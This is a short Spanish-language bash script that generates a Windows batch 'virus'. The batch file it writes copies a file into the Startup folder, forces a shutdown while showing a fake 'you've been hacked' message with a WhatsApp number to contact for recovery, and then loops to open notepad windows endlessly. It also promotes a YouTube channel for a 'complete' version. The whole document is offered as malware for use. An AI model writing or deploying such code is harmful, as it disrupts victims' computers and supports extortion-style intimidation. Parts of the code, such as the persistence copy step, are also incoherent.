clear
ruta=$(pwd)
read -p "esto creara un virus para colapsar windows estas seguro de continuar?(y/n)DEFAULT=n?: " seguro
if [ $seguro == y ];then
rm -rf "virus_incompleto"
mkdir "virus_incompleto"
cd "virus_incompleto"
read -p "ingresa tu numero de telefuno ej: +34 621 37 76 59: " num
touch quieres_completarlo?.txt
echo "si quieres completarlo revisa mi canal de youtube ciroprogamer86" > quieres_completarlo?.txt
touch virus.bat
echo "" > virus.bat
echo '@echo off' > virus.bat
echo 'copy "c:\wsl2.bat" "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"' >> virus.bat
echo 'shutdown -s -f -t 15 -c "Has sido hackeado, esto es una prueba de la vulnerabilidad de Windows. Si deseas recuperar el sistema, contacta al WhatsApp '"$num"'"' >> virus.bat
echo ':bucle' >> virus.bat
echo 'start notepad' >> virus.bat
echo 'goto bucle' >> virus.bat
sleep 2s
cd ${ruta}
clear
echo listo
sleep 3s
fi

